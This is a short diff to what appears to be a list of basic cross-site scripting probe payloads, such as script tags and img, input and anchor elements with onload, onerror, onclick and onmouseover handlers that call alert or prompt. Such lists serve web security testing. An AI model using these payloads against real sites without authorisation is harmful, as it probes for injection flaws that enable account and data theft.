@@ -8,7 +8,7 @@ Basic Payloads For First Step
 -------------------------------------------------
 <script>alert(1)</script>
 <img src=validimage.png onload=alert(1)>
-<img srcset=validimage.png onload=alert(1)>
+<img src/onerror=prompt(8)>
 <input onclick="alert(1)" style=display:block>test</input>
 <a onmouseover="alert(1)" style=display:block>test</a>
 
